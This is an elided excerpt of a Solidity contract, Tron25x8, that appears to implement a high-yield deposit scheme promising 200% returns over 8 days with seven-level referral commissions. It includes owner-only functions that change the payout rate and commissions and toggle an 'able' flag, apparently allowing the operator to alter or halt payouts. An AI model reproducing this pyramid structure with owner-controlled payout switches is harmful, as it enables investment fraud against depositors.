...
contract Tron25x8 {
    ...
    uint private rate = 25;      
    uint private releaseTime = 1600230094;
    ...
    struct Player {
        ...
        uint256 aff1sum;       //7 Level Referral Commission
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
    ...
    function register(address _addr, address payable _affAddr) private{
        ...
        players[_affAddr4].aff4sum += 1;
        players[_affAddr5].aff5sum += 1;
        players[_affAddr6].aff6sum += 1;
        players[_affAddr7].aff7sum += 1;
    }
            ...
            if(players[msg.sender].deposits[pa].amount > 0){
                ...
                for(uint i=0 ; i< pos;i++){
                    ...
                    if(players[msg.sender].deposits[r].amount ==0){
                        players[msg.sender].deposits[r] = Deposit(msg.value,now,now+8 days,0);
                        return true;
                    }
                    t++;
                }
            }else{
                players[msg.sender].deposits[pa] = Deposit(msg.value,now,now+8 days,0);
                return true;
            }
        }else{
            players[msg.sender].deposits[p] = Deposit(msg.value,now,now+8 days,0);
            return true;
        }
    }
    function withdraw(uint pos) public returns(uint256){
        ...
        uint256 total = getPercent(player.deposits[pos].amount,rate)*8;
    ...
    function getAble()public view returns(bool){
        return able;
    }
    ...
    function setCommision(uint por) public onlyOwner returns(uint){
        rate = por;
        return rate;
    }
    function setCommisionDev(uint por) public onlyOwner returns(uint){
        devCommission = por;
        return devCommission;
    }
    function setAble(uint abl) public onlyOwner returns(bool){
        if( abl==1){
            able = true;
            return able;
        }else{
